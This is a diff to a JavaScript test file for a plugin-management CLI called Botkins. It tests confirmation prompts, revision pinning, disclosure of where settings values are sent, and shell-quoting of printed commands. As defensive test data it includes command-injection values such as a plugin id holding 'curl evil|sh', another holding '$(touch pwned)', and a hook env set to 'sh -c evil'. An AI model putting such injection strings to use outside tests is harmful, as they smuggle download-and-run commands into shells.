@@ -150,7 +150,9 @@ test("a plugin that runs commands is looked at first, and a yes names the revisi
   assert.equal((await botkins(["plugins", "configure", "memory", "--unset", "REGION"])).exit, 0);
   assert.match((await botkins(["plugins", "show", "memory"])).out, /Settings:\n {2}MEMORY_API_KEY \(needed\) \(secret\) \(has a value\): goes to the header Authorization/);
   // From a file: where the value goes is said on standard error, and the value is in neither output.
-  const filed = await botkins(["plugins", "configure", "memory", "--json", "--settings", settings]);
+  // (A value that goes into a header to an address needs the yes with the installed revision: the next test holds that rule.)
+  const configuredRevision = (await client.call("plugins.get", "memory")).revision;
+  const filed = await botkins(["plugins", "configure", "memory", "--json", "--yes", "--revision", configuredRevision, "--settings", settings]);
   assert.equal(filed.exit, 0, filed.err);
   assert.match(filed.err, /These values go to:\n {2}MEMORY_API_KEY .*goes to the header Authorization of the tool memory/);
   assert.equal((filed.out + filed.err).includes(SECRET), false);
@@ -163,7 +165,7 @@ test("a plugin that runs commands is looked at first, and a yes names the revisi
     assert.equal(refused.exit, 1, JSON.stringify(bad));
   }
   // A saved credential by its reference is a shape the app knows: one that does not exist is refused by the app, not by the command.
-  const byReference = await botkins(["plugins", "configure", "memory", "--settings", write(join(market, "..", "ref.json"), { MEMORY_API_KEY: { $credential: "no-such-credential" } })]);
+  const byReference = await botkins(["plugins", "configure", "memory", "--yes", "--revision", configuredRevision, "--settings", write(join(market, "..", "ref.json"), { MEMORY_API_KEY: { $credential: "no-such-credential" } })]);
   assert.equal(byReference.exit, 1);
   assert.doesNotMatch(byReference.err, /not JSON/);
 
@@ -310,7 +312,8 @@ test("text from a plugin is shown as text: a character that hides or turns it is
   const { botkins, dir, write, client } = await setup(t);
   const [turn, none, escape] = ["\u202e", "\u200b", "\u001b[2K"];
   const odd = join(dir, "odd");
-  write(join(odd, "plugin.json"), { name: "odd" + turn + "name", version: "1.0.0", description: "It" + none + "hides" + escape, userConfig: { KEY: { title: "A" + turn + "label" } } });
+  // (The app refuses a name like this one at its source, so the name here is plain: a stand-in client below has an id that is not.)
+  write(join(odd, "plugin.json"), { name: "odd", version: "1.0.0", description: "It" + none + "hides" + escape, userConfig: { KEY: { title: "A" + turn + "label" } } });
   write(join(odd, "hooks.json"), { hooks: { sessionStart: [{ command: "echo " + turn + "dlrow", env: { V: "${KEY}", W: "a" + turn + "b", GIT_SSH_COMMAND: "sh -c evil", ["N" + none]: "x" } }] } });
   write(join(odd, ".mcp.json"), { mcpServers: { ["to" + none + "ol"]: { command: "node", args: ["a" + escape + "b"], cwd: "/x" + turn }, web: { url: "https://example.test/" + turn + "mcp", headers: { ["X" + none]: "${KEY}" } } } });
   const added = await botkins(["plugins", "add-folder", odd]);
@@ -454,17 +457,20 @@ test("install --settings for a plugin that runs nothing: a secret that goes to a
   assert.equal(done.exit, 0, done.err);
   assert.equal((done.out + done.err).includes(SECRET), false);
   await botkins(["plugins", "uninstall", id, "--yes"]);
-  // A value that is not a secret, or a secret that goes to no address: said, and no question.
+  // A value that is not marked secret goes into a header all the same, so it needs the yes as well.
   const plain = await botkins(["plugins", "install", id, "--settings", regionFile]);
-  assert.equal(plain.exit, 0, plain.err);
-  assert.match(plain.err, /^These values go to:\n {2}REGION: goes to the header X-Region of the tool api at https:\/\/api\.example\.test\/mcp\n$/);
+  assert.equal(plain.exit, 2, plain.err);
+  assert.match(plain.err, /\nFor: every bot\nThese values go to:\n {2}REGION: goes to the header X-Region of the tool api at https:\/\/api\.example\.test\/mcp\n/);
+  assert.equal((await botkins(["plugins", "install", id, "--settings", regionFile, "--yes"])).exit, 2);
+  assert.deepEqual(await installedNames(), []);
+  assert.equal((await botkins(["plugins", "install", id, "--settings", regionFile, "--yes", "--revision", revision])).exit, 0);
   await botkins(["plugins", "uninstall", id, "--yes"]);
   // With no settings nothing is said and nothing is asked, as before.
   const bare = await botkins(["plugins", "install", id]);
   assert.deepEqual([bare.exit, bare.err], [0, ""]);
   // A saved credential is not used by reference from the command line: the service says where it is chosen.
   const byReference = write(join(dir, "ref.json"), { WEB_KEY: { $credential: "some-credential" } });
-  const configured = await botkins(["plugins", "configure", id, "--settings", byReference]);
+  const configured = await botkins(["plugins", "configure", id, "--yes", "--revision", revision, "--settings", byReference]);
   assert.equal(configured.exit, 1);
   assert.match(configured.err, /A saved credential is chosen in the app's window or on a paired phone\. From the command line, give the value itself/);
   await botkins(["plugins", "uninstall", id, "--yes"]);
@@ -618,4 +624,316 @@ test("an update compares the whole description: a hook's order and time limit, a
   const files = (count, paths) => ({ count, bytes: count * 10, files: paths.map((path) => ({ path, bytes: 10, config: true })) });
   const moved = await updateOf(description({ tools: [WEB_TOOL], otherFiles: files(2, ["a.json", "b.json"]) }), description({ tools: [WEB_TOOL], otherFiles: files(2, ["a.json", "c.json"]) }));
   assert.match(moved.err, /new configuration files: c\.json\n {2}configuration files that are gone: b\.json\n/);
+});
+
+/** A folder plugin that has one of each part of a description: a hook with env and a time limit, a local tool with arguments, a remote tool (a stream, a written header and a header with a setting, a sign-in client), a setting with a default, an event that Botkins does not have, and a package.json beside them. */
+function richFolder(write, folder, { other = false } = {}) {
+  write(join(folder, "plugin.json"), { name: "rich", version: "1.0.0", userConfig: { REGION: { title: "Region", default: "eu" }, KEY: { title: "Key", sensitive: true } } });
+  const start = { type: "command", bash: "node ./a.mjs", env: { LEVEL: "${REGION}" }, timeoutSec: 30 };
+  const end = { type: "command", bash: "node ./b.mjs" };
+  // The runtime keeps hooks in the order of their events in the file.
+  write(join(folder, "hooks.json"), { hooks: { ...(other ? { sessionEnd: [end], sessionStart: [start] } : { sessionStart: [start], sessionEnd: [end] }), madeUpEvent: [{ type: "command", bash: "node ./c.mjs" }] } });
+  write(join(folder, ".mcp.json"), { mcpServers: { local: { command: "node", args: ["server.mjs", "--flag"] }, web: { type: "sse", url: "https://web.example.test/sse", headers: { "X-Fixed": other ? "two" : "one", Authorization: "Bearer ${KEY}", "X-Region": "${REGION}" }, oauth: { clientId: "client-1" } } } });
+  write(join(folder, "package.json"), { name: other ? "pkg-changed" : "pkg" });
+  for (const file of ["a.mjs", "b.mjs", "server.mjs"]) write(join(folder, file), "// a file of the plugin\n");
+}
+
+test("against the real service: show prints the whole description of a plugin with every part, so a change of its shape breaks this test", { skip }, async (t) => {
+  const { botkins, dir, write } = await setup(t);
+  const rich = join(dir, "rich");
+  richFolder(write, rich);
+  const added = await botkins(["plugins", "add-folder", rich]);
+  assert.equal(added.exit, 0, added.err);
+  const shown = await botkins(["plugins", "show", "rich"]);
+  assert.equal(shown.exit, 0, shown.err);
+  assert.match(shown.out, /^rich 1\.0\.0 {3}rich@folder-[a-f0-9]{12} {3}\(installed, off\)\nHolds: 2 tools, 2 hooks\.\nBots: every bot\n/);
+  // The hooks, in order, each with its time limit and its environment value as written; then the program with all its words.
+  assert.match(shown.out, /Runs on this computer, as the user that runs Botkins:\n {2}at sessionStart: node \.\/a\.mjs\n {6}for at most 30 seconds\n {6}with LEVEL="\$\{REGION\}"\n {2}at sessionEnd: node \.\/b\.mjs\n {6}for at most 10 seconds\n {2}the tool local: node server\.mjs --flag\n/);
+  // The tool on the web: its kind, a header as written and one with a setting in it, and its sign-in.
+  assert.match(shown.out, /Reaches on the web:\n {2}the tool web: https:\/\/web\.example\.test\/sse, as a stream \(sse\)\n {6}with the header X-Fixed="one"\n {6}with the header Authorization="Bearer \$\{KEY\}"\n {6}with the header X-Region="\$\{REGION\}"\n {6}signs in, with the client id "client-1"\n/);
+  // A setting's default, and where each setting goes.
+  assert.match(shown.out, /Settings:\n {2}REGION .*\(default "eu"\): goes to the header X-Region of the tool web at https:\/\/web\.example\.test\/sse; the environment value LEVEL of the hook at sessionStart\n {2}KEY \(secret\): goes to the header Authorization of the tool web at https:\/\/web\.example\.test\/sse\n/);
+  // What Botkins does not run, and the other files beside the commands.
+  assert.match(shown.out, /Not run by Botkins:\n {2}the hook madeUpEvent: .+\n/);
+  assert.match(shown.out, /Other files of the plugin: \d+ files, \d+ bytes\n {2}configuration files: package\.json\nA command runs with these files, and Botkins cannot show all that they make it do\.\n/);
+  assert.match(shown.out, /Installed revision: [a-f0-9]{64}\nIts source is the same as the installed copy\.\n$/);
+});
+
+test("against the real service: an update of a folder plugin says what changed in a header, in the order of the hooks and in the other files", { skip }, async (t) => {
+  const { botkins, dir, write, client } = await setup(t);
+  const rich = join(dir, "rich");
+  richFolder(write, rich);
+  assert.equal((await botkins(["plugins", "add-folder", rich])).exit, 0);
+  assert.match((await botkins(["plugins", "update", "rich"])).out, /rich is up to date\./);
+  // The folder changes: another value in a header, the hooks in another order, another package.json.
+  richFolder(write, rich, { other: true });
+  const refused = await botkins(["plugins", "update", "rich"]);
+  assert.equal(refused.exit, 2, "it runs commands, so it asks");
+  assert.match(refused.err, /^rich: what this update changes\nNew or changed, reaches on the web:\n {2}the tool web: https:\/\/web\.example\.test\/sse, as a stream \(sse\)\n {6}with the header X-Fixed="two"\n/);
+  assert.match(refused.err, /No longer reaches:\n {2}the tool web: .*\n {6}with the header X-Fixed="one"\n/);
+  assert.match(refused.err, /\nThe order of the hooks changed\.\n/);
+  assert.match(refused.err, /\nThe other files of the plugin changed: from \d+ files, \d+ bytes to \d+ files, \d+ bytes\.\n/);
+  // The installed copy was made with the files counted, so they are compared, and that is not said to be missing.
+  assert.equal(refused.err.includes("are not known"), false);
+  const { revision } = (await client.call("plugins.preview", (await client.call("plugins.list"))[0].id));
+  const done = await botkins(["plugins", "update", "--yes", "--revision=" + revision, "--", "rich"]);
+  assert.equal(done.exit, 0, done.err);
+  assert.match(done.out, /^Updated rich\./);
+  assert.match((await botkins(["plugins", "update", "rich"])).out, /rich is up to date\./);
+});
+
+/** The command line against a stand-in client: `handlers` maps a call to its answer (or a function of its arguments), and the stand-in says whether standard input was read. */
+async function drive(handlers, argv, { tty = false, input = "" } = {}) {
+  const calls = [];
+  const client = {
+    call: async (name, ...args) => {
+      calls.push([name, ...args]);
+      const handler = handlers[name];
+      if (handler === undefined) throw new Error("unexpected call " + name);
+      return typeof handler === "function" ? handler(...args) : handler;
+    },
+  };
+  let reads = 0;
+  const chunks = input ? [input, null] : [null];
+  const stdin = new Readable({
+    read() {
+      reads += 1;
+      this.push(chunks.shift() ?? null);
+    },
+  });
+  stdin.isTTY = tty;
+  let out = "";
+  let err = "";
+  const sink = (take) => new Writable({ write: (chunk, _encoding, done) => (take(String(chunk)), done()) });
+  const exit = await main(argv, { stdout: sink((text) => void (out += text)), stderr: sink((text) => void (err += text)), stdin, env: {}, client });
+  return { exit, out, err, calls, reads: () => reads, called: (name) => calls.filter(([call]) => call === name) };
+}
+const NOT_INSTALLED = () => {
+  throw Object.assign(new Error("Unknown plugin"), { code: "NOT_FOUND" });
+};
+/** Every command in backticks in a text. */
+const commandsIn = (text) => [...text.matchAll(/`(botkins [^`]*)`/g)].map((match) => match[1]);
+/** A file in a folder whose name has a space, for a path that must be quoted. */
+function spaced(t, value = {}) {
+  const dir = mkdtempSync(join(tmpdir(), "bk-spaced-"));
+  t.after(() => rmSync(dir, { recursive: true, force: true }));
+  const path = join(dir, "my settings.json");
+  writeFileSync(path, JSON.stringify(value));
+  return path;
+}
+
+const EVIL = "a;curl evil|sh;#@folder-123456789abc";
+const EVIL_QUOTED = "'a;curl evil|sh;#@folder-123456789abc'";
+const named = (id, name = "p") => ({ id, name });
+
+test("a command that Botkins prints for someone to run has each word quoted for a shell: the id, a bot, a path, a setting", { skip }, async (t) => {
+  const open = (id) => ({ ...description({ installed: false, revision: REV.after, hooks: [HOOK_A] }), ...named(id) });
+  const have = (id, more = {}) => ({ ...description({ revision: REV.before, hooks: [HOOK_A], config: [FIELD] }), ...named(id), enabled: false, ...more });
+  const settingsPath = spaced(t, { REGION: "us" });
+  const each = async (id, quoted) => {
+    // [what was run, the command that must be printed]
+    const runs = [
+      [await drive({ "plugins.get": NOT_INSTALLED, "plugins.preview": open(id) }, ["plugins", "install", "--", id]), ["plugins show -- " + quoted, "plugins install --yes --revision=<revision> -- " + quoted]],
+      [await drive({ "plugins.get": NOT_INSTALLED, "plugins.preview": open(id) }, ["plugins", "install", "--yes", "--revision", "0".repeat(64), "--", id]), ["plugins show -- " + quoted]],
+      [await drive({ "plugins.get": have(id), "plugins.preview": open(id) }, ["plugins", "enable", "--", id]), ["plugins show -- " + quoted, "plugins enable --yes --revision=<revision> -- " + quoted]],
+      [await drive({ "plugins.get": have(id), "plugins.preview": open(id) }, ["plugins", "update", "--", id]), ["plugins show -- " + quoted, "plugins update --yes --revision=<revision> -- " + quoted]],
+      [await drive({ "plugins.get": have(id), "plugins.preview": open(id) }, ["plugins", "update", "--yes", "--revision", "0".repeat(64), "--", id]), ["plugins show -- " + quoted]],
+      [await drive({ "plugins.get": have(id), "plugins.preview": open(id) }, ["plugins", "update", "--revision", REV.before, "--", id]), ["plugins show -- " + quoted]],
+      [await drive({ "plugins.get": have(id, { enabled: true, bots: ["b1"] }), "bots.get": (ref) => ({ id: "id-" + ref, name: ref }) }, ["plugins", "bots", "--bot", "Orbit", "--bot", "My Bot", "--", id]), ["plugins bots --bot=Orbit '--bot=My Bot' --yes --revision=<revision> -- " + quoted]],
+      [await drive({ "plugins.get": have(id, { enabled: true, bots: ["b1"] }), "bots.get": (ref) => ({ id: "id-" + ref, name: ref }) }, ["plugins", "bots", "--all", "--", id]), ["plugins bots --all --yes --revision=<revision> -- " + quoted]],
+      [await drive({ "plugins.get": have(id) }, ["plugins", "configure", "--settings", settingsPath, "--unset", "NO KEY", "--", id]), ["plugins show -- " + quoted, "plugins configure --settings '" + settingsPath + "' '--unset=NO KEY' --yes --revision=<revision> -- " + quoted]],
+      [await drive({ "plugins.get": have(id), "plugins.preview": { ...open(id), revision: REV.after } }, ["plugins", "show", "--", id]), ["plugins update -- " + quoted]],
+      [await drive({ "plugins.get": NOT_INSTALLED, "plugins.preview": { ...description({ installed: false, revision: REV.after }), ...named(id) }, "plugins.install": { ...have(id), config: [{ key: "KEY", required: true, set: false }] } }, ["plugins", "install", "--", id]), ["plugins configure -- " + quoted]],
+      [await drive({ "plugins.addFolder": { id }, "plugins.get": have(id) }, ["plugins", "add-folder", "/some/folder"]), ["plugins enable -- " + quoted]],
+      [await drive({ "plugins.get": have(id) }, ["plugins", "install", "--", id]), ["plugins update -- " + quoted]],
+    ];
+    return runs.map(([run, wanted]) => ({ ...run, all: run.out + run.err, wanted }));
+  };
+
+  // An id that has `;`, `|` and `#` in it: each command has it in single quotes, whole, and the raw id is never after "-- ".
+  for (const run of await each(EVIL, EVIL_QUOTED)) {
+    for (const command of run.wanted) assert.ok(commandsIn(run.all).includes("botkins " + command), "printed: " + command + "\n" + run.all);
+    for (const command of commandsIn(run.all).filter((line) => line.includes(" -- "))) assert.ok(command.endsWith("-- " + EVIL_QUOTED), command);
+    assert.equal(run.all.includes("-- " + EVIL), false, run.all);
+  }
+  // A single quote is written as '\'' , and `$(` and a backtick in an id are in single quotes too.
+  const tick = "it's;x@folder-123456789abc";
+  for (const run of await each(tick, "'it'\\''s;x@folder-123456789abc'")) for (const command of run.wanted) assert.ok(commandsIn(run.all).includes("botkins " + command), "printed: " + command + "\n" + run.all);
+  const dollar = "a$(touch pwned)`x@folder-123456789abc";
+  const bare = await drive({ "plugins.get": NOT_INSTALLED, "plugins.preview": open(dollar) }, ["plugins", "install", "--", dollar]);
+  assert.ok(bare.err.includes("-- 'a$(touch pwned)`x@folder-123456789abc'`."), bare.err);
+  // An ordinary id is printed as it is.
+  for (const run of await each("memory@test-market", "memory@test-market")) for (const command of run.wanted) assert.ok(commandsIn(run.all).includes("botkins " + command), "printed: " + command + "\n" + run.all);
+  // A bot and a path with a character that turns text have no runnable form: a placeholder, and a sentence that says where to look.
+  const turn = String.fromCodePoint(0x202e);
+  const bots = await drive({ "plugins.get": have("p@m", { enabled: true, bots: ["b1"] }), "bots.get": (ref) => ({ id: "id-" + ref, name: ref }) }, ["plugins", "bots", "--bot", "Or" + turn + "bit", "--", "p@m"]);
+  assert.ok(bots.err.includes("`botkins plugins bots --bot=<the bot> --yes --revision=<revision> -- p@m`."), bots.err);
+  assert.match(bots.err, /`botkins bots list --json`/);
+  assert.equal((bots.out + bots.err).includes(turn), false);
+
+  // A plugin whose id has a character that turns text: no runnable command at all, a placeholder, and the way to get the id.
+  const odd = "a" + turn + "b@folder-123456789abc";
+  for (const run of await each(odd, "<its id>")) {
+    assert.equal(run.all.includes(turn), false, run.all);
+    assert.equal(/-- '/.test(run.all), false, "no quoted form of this id: " + run.all);
+    for (const command of run.wanted) assert.ok(commandsIn(run.all).includes("botkins " + command), "printed: " + command + "\n" + run.all);
+    assert.match(run.all, /Take the id from `botkins plugins list --json`: it has a character that cannot be written in a command\./);
+  }
+});
+
+test("a value that goes into a header to an address needs the yes for install and for configure, whatever the plugin calls the setting", { skip }, async (t) => {
+  const settings = spaced(t, { REGION: "us" });
+  const web = description({ installed: false, revision: REV.after, tools: [WEB_TOOL], config: [FIELD] });
+  const install = (argv, more) => drive({ "plugins.get": NOT_INSTALLED, "plugins.preview": web, "plugins.install": { ...web, installed: true } }, ["plugins", "install", "p@m", "--settings", settings, ...argv], more);
+  const block = /\nFor: every bot\nThese values go to:\n {2}REGION \(default "eu"\): goes to the header X-Region of the tool api at https:\/\/api\.example\.test\/mcp\n/;
+  // REGION is not marked secret. With no terminal, and with a yes alone, it is refused, and where it goes is shown.
+  for (const [argv, tty] of [[[], false], [["--yes"], false], [["--yes"], true], [["--json"], true]]) {
+    const refused = await install(argv, { tty });
+    assert.equal(refused.exit, 2, argv.join(" ") + tty);
+    assert.match(refused.err, block);
+    assert.ok(refused.err.includes("`botkins plugins install --settings '" + settings + "' --yes --revision=<revision> -- p@m`"), refused.err);
+    assert.equal(refused.called("plugins.install").length, 0);
+  }
+  // At a terminal the person is asked; a "no" installs nothing.
+  const no = await install([], { tty: true, input: "n\n" });
+  assert.equal(no.exit, 1);
+  assert.match(no.err, /Install it and send these values to the addresses above\? \[y\/N\]/);
+  assert.equal(no.called("plugins.install").length, 0);
+  const yes = await install([], { tty: true, input: "y\n" });
+  assert.equal(yes.exit, 0, yes.err);
+  assert.deepEqual(yes.called("plugins.install")[0].slice(2), [{ revision: REV.after, config: { REGION: "us" } }]);
+  // A caller's yes names the revision.
+  assert.equal((await install(["--yes", "--revision", REV.before])).exit, 1);
+  const named = await install(["--yes", "--revision", REV.after]);
+  assert.equal(named.exit, 0, named.err);
+  assert.equal(named.called("plugins.install").length, 1);
+  // A value for an environment value of the plugin's own program, or for nothing, is shown and needs no more yes (the plugin has to be installed on its own terms).
+  for (const sentTo of [[{ env: "MODE", tool: "api" }], []]) {
+    const plain = description({ installed: false, revision: REV.after, tools: [WEB_TOOL], config: [{ ...FIELD, key: "MODE", sentTo }] });
+    const quiet = await drive({ "plugins.get": NOT_INSTALLED, "plugins.preview": plain, "plugins.install": plain }, ["plugins", "install", "p@m", "--settings", spaced(t, { MODE: "x" })]);
+    assert.equal(quiet.exit, 0, quiet.err);
+    assert.match(quiet.err, /^These values go to:\n {2}MODE/);
+    assert.equal(quiet.called("plugins.install").length, 1);
+  }
+
+  // configure: the same, and the revision is the one of the INSTALLED copy.
+  const installed = { ...description({ revision: REV.before, tools: [WEB_TOOL], config: [FIELD] }) };
+  const configure = (argv, more) => drive({ "plugins.get": installed, "plugins.configure": {} }, ["plugins", "configure", "p@m", ...argv], more);
+  for (const [argv, tty] of [[["--settings", settings], false], [["--settings", settings, "--yes"], false], [["--settings", settings, "--yes"], true], [["--settings", settings, "--json"], true]]) {
+    const refused = await configure(argv, { tty });
+    assert.equal(refused.exit, 2, argv.join(" ") + tty);
+    assert.match(refused.err, /^These values go to:\n {2}REGION \(default "eu"\): goes to the header X-Region of the tool api at https:\/\/api\.example\.test\/mcp\n/);
+    assert.ok(refused.err.includes("`botkins plugins configure --settings '" + settings + "' --yes --revision=<revision> -- p@m`"), refused.err);
+    assert.equal(refused.called("plugins.configure").length, 0);
+  }
+  assert.equal((await configure(["--settings", settings, "--yes", "--revision", REV.after])).exit, 1, "a wrong revision");
+  assert.match((await configure(["--settings", settings, "--yes", "--revision", REV.after])).err, /is not the one that you looked at/);
+  const noOne = await configure(["--settings", settings], { tty: true, input: "n\n" });
+  assert.equal(noOne.exit, 1);
+  assert.match(noOne.err, /Send these values there\? \[y\/N\]/);
+  assert.equal(noOne.called("plugins.configure").length, 0);
+  assert.equal((await configure(["--settings", settings], { tty: true, input: "y\n" })).called("plugins.configure").length, 1);
+  const worked = await configure(["--settings", settings, "--yes", "--revision", REV.before]);
+  assert.equal(worked.exit, 0, worked.err);
+  assert.deepEqual(worked.called("plugins.configure")[0].slice(1), ["p@m", { REGION: "us" }]);
+  // Taking a value away sends nothing, so it needs no yes. What is typed at a terminal is the person in the conversation: said before the question, and no more yes.
+  const unset = await configure(["--unset", "REGION"]);
+  assert.equal(unset.exit, 0, unset.err);
+  assert.deepEqual(unset.called("plugins.configure")[0].slice(1), ["p@m", { REGION: null }]);
+  const typed = await configure([], { tty: true, input: "us\n" });
+  assert.equal(typed.exit, 0, typed.err);
+  assert.match(typed.err, /Region goes to the header X-Region of the tool api at https:\/\/api\.example\.test\/mcp\./);
+  assert.equal(typed.err.includes("Send these values there?"), false);
+  assert.deepEqual(typed.called("plugins.configure")[0].slice(1), ["p@m", { REGION: "us" }]);
+  // A value for the plugin's own program needs no yes either.
+  const program = { ...installed, config: [{ ...FIELD, key: "MODE", sentTo: [{ env: "MODE", tool: "api" }] }] };
+  const own = await drive({ "plugins.get": program, "plugins.configure": {} }, ["plugins", "configure", "p@m", "--settings", spaced(t, { MODE: "x" })]);
+  assert.equal(own.exit, 0, own.err);
+});
+
+test("--settings - is refused before standard input is read when a question must be asked, and read to its end when none is", { skip }, async (t) => {
+  const web = description({ installed: false, revision: REV.after, tools: [WEB_TOOL], config: [FIELD] });
+  const input = JSON.stringify({ REGION: "us" });
+  const install = (handlers, argv, more) => drive({ "plugins.get": NOT_INSTALLED, "plugins.preview": web, "plugins.install": web, ...handlers }, ["plugins", "install", "p@m", "--settings", "-", ...argv], { input, ...more });
+  // At a terminal and without one: the question could not be answered by the same stream, so it is said first, with nothing read.
+  for (const tty of [true, false]) {
+    const refused = await install({}, [], { tty });
+    assert.equal(refused.exit, 2, "terminal " + tty);
+    assert.equal(refused.reads(), 0, "standard input was not read");
+    assert.match(refused.err, /--settings - reads standard input, which cannot also answer the question that this plugin needs\. Give --yes with --revision after you looked at it, or give --settings a file path instead of -\./);
+    assert.ok(refused.err.includes("`botkins plugins install --settings - --yes --revision=<revision> -- p@m`"), refused.err);
+    assert.match(refused.err, /Reaches on the web:/, "what it reaches is shown first");
+    assert.equal(refused.called("plugins.install").length, 0);
+  }
+  assert.equal((await install({}, ["--yes"], { tty: true })).reads(), 0, "a yes alone is not enough");
+  // A plugin that runs commands asks whatever the settings hold.
+  const hooked = description({ installed: false, revision: REV.after, hooks: [HOOK_A], config: [{ ...FIELD, sentTo: [] }] });
+  assert.equal((await install({ "plugins.preview": hooked }, [], { tty: true })).reads(), 0);
+  // With the yes of a caller, with the revision, the settings are read and used.
+  const named = await install({}, ["--yes", "--revision", REV.after], {});
+  assert.equal(named.exit, 0, named.err);
+  assert.ok(named.reads() > 0);
+  assert.deepEqual(named.called("plugins.install")[0].slice(2), [{ revision: REV.after, config: { REGION: "us" } }]);
+  // A plugin that could not ask: standard input is read to its end for the settings, at a terminal too.
+  const plain = description({ installed: false, revision: REV.after, tools: [WEB_TOOL], config: [{ ...FIELD, sentTo: [{ env: "REGION", tool: "api" }] }] });
+  const quiet = await install({ "plugins.preview": plain, "plugins.install": plain }, [], { tty: true });
+  assert.equal(quiet.exit, 0, quiet.err);
+  assert.ok(quiet.reads() > 0);
+  assert.deepEqual(quiet.called("plugins.install")[0].slice(2), [{ revision: REV.after, config: { REGION: "us" } }]);
+
+  // configure: the same.
+  const installed = description({ revision: REV.before, tools: [WEB_TOOL], config: [FIELD] });
+  const configure = (argv, more) => drive({ "plugins.get": installed, "plugins.configure": {} }, ["plugins", "configure", "p@m", "--settings", "-", ...argv], { input, ...more });
+  for (const tty of [true, false]) {
+    const refused = await configure([], { tty });
+    assert.equal(refused.exit, 2);
+    assert.equal(refused.reads(), 0);
+    assert.match(refused.err, /--settings - reads standard input, which cannot also answer the question/);
+    assert.ok(refused.err.includes("--yes --revision=<revision> -- p@m`"), refused.err);
+  }
+  const done = await configure(["--yes", "--revision", REV.before], {});
+  assert.equal(done.exit, 0, done.err);
+  assert.deepEqual(done.called("plugins.configure")[0].slice(1), ["p@m", { REGION: "us" }]);
+  const own = await drive({ "plugins.get": { ...installed, config: [{ ...FIELD, sentTo: [] }] }, "plugins.configure": {} }, ["plugins", "configure", "p@m", "--settings", "-"], { input, tty: true });
+  assert.equal(own.exit, 0, own.err);
+  assert.ok(own.reads() > 0);
+});
+
+test("an update says when the installed copy has no other files kept, and compares the hooks as a list: a hook that is there twice is not a change of order", { skip }, async () => {
+  const unknown = "The other files of the installed version are not known, so they are not compared.";
+  const files = { count: 1, bytes: 10, files: [{ path: "config/a.json", bytes: 10, config: true }] };
+  // The first update of a plugin from before the files were kept: said, whatever else the block says.
+  const first = await updateOf(description({ hooks: [HOOK_A] }), description({ hooks: [HOOK_A], otherFiles: files }));
+  assert.equal(first.exit, 2);
+  assert.match(first.err, new RegExp("\\n" + unknown.replace(/\./g, "\\.") + "\\n"));
+  assert.match((await updateOf(description({ hooks: [HOOK_A] }), description({ hooks: [HOOK_A, HOOK_B], otherFiles: files }))).err, new RegExp("New or changed, runs on this computer:\\n[\\s\\S]*\\n" + unknown.replace(/\./g, "\\.") + "\\n"));
+  // With the files kept, there is nothing to say.
+  assert.equal((await updateOf(description({ hooks: [HOOK_A], otherFiles: files }), description({ hooks: [HOOK_A], otherFiles: files, bots: ["b1"] }))).err.includes("not known"), false);
+
+  const order = "\nThe order of the hooks changed.\n";
+  // The same hooks in another order, with one of them twice: the order changed.
+  const swappedTwice = await updateOf(description({ hooks: [HOOK_A, HOOK_A, HOOK_B] }), description({ hooks: [HOOK_B, HOOK_A, HOOK_A] }));
+  assert.ok(swappedTwice.err.includes(order), swappedTwice.err);
+  // The same list: no change.
+  const same = await updateOf(description({ hooks: [HOOK_A, HOOK_A] }), description({ hooks: [HOOK_A, HOOK_A] }));
+  assert.equal(same.err.includes("order of the hooks"), false);
+  assert.doesNotMatch(same.err, /New or changed hooks|Hooks that are gone/);
+  // A hook that is there fewer times, more times, or both added and listed again: a change with its count, and not a change of order.
+  const fewer = await updateOf(description({ hooks: [HOOK_A, HOOK_A] }), description({ hooks: [HOOK_A] }));
+  assert.equal(fewer.err.includes("order of the hooks"), false);
+  assert.match(fewer.err, /\nHooks that are gone or are there fewer times:\n {2}at sessionStart: node a\.mjs\n {6}for at most 10 seconds\n {6}1 time now, 2 times before\n/);
+  const more = await updateOf(description({ hooks: [HOOK_A, HOOK_B] }), description({ hooks: [HOOK_B, HOOK_A, HOOK_A] }));
+  assert.equal(more.err.includes("order of the hooks"), false);
+  assert.match(more.err, /\nNew or changed hooks:\n {2}at sessionStart: node a\.mjs\n {6}for at most 10 seconds\n {6}2 times now, 1 time before\n/);
+  const added = await updateOf(description({ hooks: [HOOK_A] }), description({ hooks: [HOOK_A, HOOK_A] }));
+  assert.match(added.err, /\nNew or changed hooks:\n {2}at sessionStart: node a\.mjs\n {6}for at most 10 seconds\n {6}2 times now, 1 time before\n/);
+  // A hook that is gone whole is said by "No longer runs", once.
+  const gone = await updateOf(description({ hooks: [HOOK_A, HOOK_B] }), description({ hooks: [HOOK_A] }));
+  assert.match(gone.err, /No longer runs:\n {2}at sessionEnd: node b\.mjs\n/);
+  assert.equal(gone.err.includes("gone or are there fewer times"), false);
+  assert.equal(gone.err.includes("order of the hooks"), false);
+  // With --json the counts are in the answer.
+  const json = await against({ ...description({ hooks: [HOOK_A, HOOK_A] }), revision: REV.before }, { ...description({ hooks: [HOOK_A] }), revision: REV.after }, ["plugins", "update", "p", "--json", "--yes", "--revision", REV.after]);
+  assert.equal(json.exit, 0, json.err);
+  assert.deepEqual(JSON.parse(json.out).changed.hooksFewer.map((hook) => [hook.event, hook.times, hook.before]), [["sessionStart", 1, 2]]);
 });
